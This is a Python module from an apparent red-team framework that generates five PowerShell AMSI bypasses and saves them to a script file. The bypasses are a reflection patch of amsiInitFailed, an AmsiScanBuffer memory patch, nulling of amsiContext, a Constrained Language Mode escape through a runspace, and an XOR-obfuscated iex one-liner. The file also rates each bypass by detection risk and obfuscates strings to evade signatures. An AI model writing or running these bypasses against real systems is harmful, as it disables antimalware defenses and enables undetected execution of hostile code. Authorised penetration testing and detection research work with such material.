"""AMSI bypass technique generator.

Maps to MITRE T1562.001 -- Impair Defenses: Disable or Modify Tools.
"""

from __future__ import annotations

import random
import secrets

from rich import box
from rich.console import Console
from rich.table import Table

from ghost.logger import info, ok, section, warn
from ghost.models import AttackResult, EngagementContext
from ghost.modules.base import BaseModule
from ghost.utils.artifacts import save_artifact

console = Console()


class AMSIBypassModule(BaseModule):
    """Generate AMSI bypass techniques for PowerShell environments.
    Maps to MITRE T1562.001 -- Impair Defenses: Disable or Modify Tools.
    """

    name = "AMSI Bypass Generator"

    def run(self, ctx: EngagementContext) -> None:
        section("Module 1 -- AMSI Bypass Generator [T1562.001]")

        if ctx.target_os != "windows":
            warn("AMSI is Windows-specific -- skipping on non-Windows target")
            ctx.results.append(AttackResult(
                module="amsi", action="skip", status="ok",
                severity="info", notes="AMSI not applicable on non-Windows target"
            ))
            return

        bypasses = []

        # -- Technique 1: amsiInitFailed Patch --
        info("Generating amsiInitFailed patch variant...")
        obf_amsi_utils = self._obfuscate_string("AmsiUtils")
        obf_init_failed = self._obfuscate_string("amsiInitFailed")
        patch1 = (
            f"$a=[Ref].Assembly.GetType('System.Management.Automation.'+{obf_amsi_utils});\n"
            f"$f=$a.GetField({obf_init_failed},'NonPublic,Static');\n"
            f"$f.SetValue($null,$true)"
        )
        bypasses.append({
            "name": "amsiInitFailed Patch",
            "technique": "Set amsiInitFailed field to True via reflection",
            "code": patch1,
            "detection_risk": "medium",
            "notes": "Widely signatured -- string obfuscation required"
        })
        ok("amsiInitFailed patch generated (detection risk: MEDIUM)")

        # -- Technique 2: AmsiScanBuffer Memory Patch --
        info("Generating AmsiScanBuffer memory patch...")
        patch2 = (
            "$w = [System.Runtime.InteropServices.Marshal]\n"
            "$p = [System.Runtime.InteropServices.RuntimeEnvironment]\n"
            "$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like '*siUtils'}\n"
            "$m = $a.GetMethods('NonPublic,Static') | ? {$_.Name -like 'Sc*ffer'}\n"
            "$b = 0\n"
            "[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]($m.MethodHandle."
            "GetFunctionPointer().ToInt64()+65), 0x80070057)"
        )
        bypasses.append({
            "name": "AmsiScanBuffer Patch",
            "technique": "Overwrite AmsiScanBuffer return value to force AMSI_RESULT_CLEAN",
            "code": patch2,
            "detection_risk": "high",
            "notes": "Modifies memory -- triggers kernel callbacks on modern EDRs"
        })
        ok("AmsiScanBuffer patch generated (detection risk: HIGH)")

        # -- Technique 3: Reflection-based Context Nulling --
        info("Generating reflection-based amsiContext null...")
        patch3 = (
            "$t=[Ref].Assembly.GetType(('System.Management.Automation.Am'+'siUt'+'ils'));\n"
            "$c=$t.GetField(('am'+'siCo'+'ntext'),[Reflection.BindingFlags]'NonPublic,Static');\n"
            "$c.SetValue($null,[IntPtr]::Zero)"
        )
        bypasses.append({
            "name": "Reflection Context Null",
            "technique": "Null the amsiContext pointer via reflection -- scans return clean",
            "code": patch3,
            "detection_risk": "medium",
            "notes": "Effective on PS 5.1, partial coverage on PS 7+"
        })
        ok("Reflection context null generated (detection risk: MEDIUM)")

        # -- Technique 4: CLM Bypass via Runspace --
        info("Generating CLM bypass via custom runspace...")
        patch4 = (
            "$rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()\n"
            "$rs.ApartmentState = 'STA'\n"
            "$rs.ThreadOptions = 'ReuseThread'\n"
            "$rs.Open()\n"
            "$ps = [PowerShell]::Create()\n"
            "$ps.Runspace = $rs\n"
            "$ps.AddScript('$ExecutionContext.SessionState.LanguageMode').Invoke()"
        )
        bypasses.append({
            "name": "CLM Bypass (Runspace)",
            "technique": "Create new runspace to escape Constrained Language Mode",
            "code": patch4,
            "detection_risk": "low",
            "notes": "Works when AppLocker enforces CLM but doesn't restrict runspace creation"
        })
        ok("CLM bypass generated (detection risk: LOW)")

        # -- Technique 5: XOR-obfuscated one-liner --
        info("Generating XOR-obfuscated bypass one-liner...")
        xor_key = secrets.randbelow(200) + 50
        raw = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        enc = ','.join([str(ord(c) ^ xor_key) for c in raw])
        patch5 = (
            f"$k={xor_key};$e=@({enc});"
            "$d=$e|%{[char]($_ -bxor $k)};iex(-join $d)"
        )
        bypasses.append({
            "name": "XOR Obfuscated One-Liner",
            "technique": f"XOR encode full bypass with key 0x{xor_key:02X}, decode at runtime",
            "code": patch5,
            "detection_risk": "low",
            "notes": "Evades static string signatures -- runtime behavior still detectable"
        })
        ok(f"XOR one-liner generated (key=0x{xor_key:02X}, detection risk: LOW)")

        # -- Test payload --
        info("Generating AMSI test payload (EICAR-style)...")
        test_payload = "Invoke-Expression 'amsiutils'"  # harmless trigger string
        bypasses.append({
            "name": "AMSI Test Payload",
            "technique": "Harmless string that triggers AMSI -- use after bypass to verify",
            "code": test_payload,
            "detection_risk": "info",
            "notes": "If this executes without AMSI alert, bypass is active"
        })
        ok("Test payload generated")

        # -- Summary table --
        table = Table(title="AMSI Bypass Variants", box=box.ROUNDED)
        table.add_column("Technique", style="cyan")
        table.add_column("Detection Risk", justify="center")
        table.add_column("Target")
        for bp in bypasses:
            risk_color = {"low": "green", "medium": "yellow", "high": "red", "info": "dim"}.get(
                bp["detection_risk"], "white")
            table.add_row(
                bp["name"],
                f"[{risk_color}]{bp['detection_risk'].upper()}[/{risk_color}]",
                bp["notes"][:60]
            )
        console.print(table)

        # -- Save artifacts --
        artifact = "\n\n".join([
            f"# --- {bp['name']} ---\n# {bp['technique']}\n# Detection Risk: "
            f"{bp['detection_risk'].upper()}\n\n{bp['code']}"
            for bp in bypasses
        ])
        path = save_artifact(ctx, "amsi_bypasses.ps1", artifact)
        ok(f"All AMSI bypasses saved to {path}")

        ctx.results.append(AttackResult(
            module="amsi", action="generate_bypasses", status="ok",
            severity="high", notes=f"Generated {len(bypasses)} AMSI bypass variants"
        ))

    @staticmethod
    def _obfuscate_string(s: str) -> str:
        parts = []
        i = 0
        while i < len(s):
            chunk_len = random.randint(2, 4)
            parts.append(f"'{s[i:i+chunk_len]}'")
            i += chunk_len
        return '(' + '+'.join(parts) + ')'
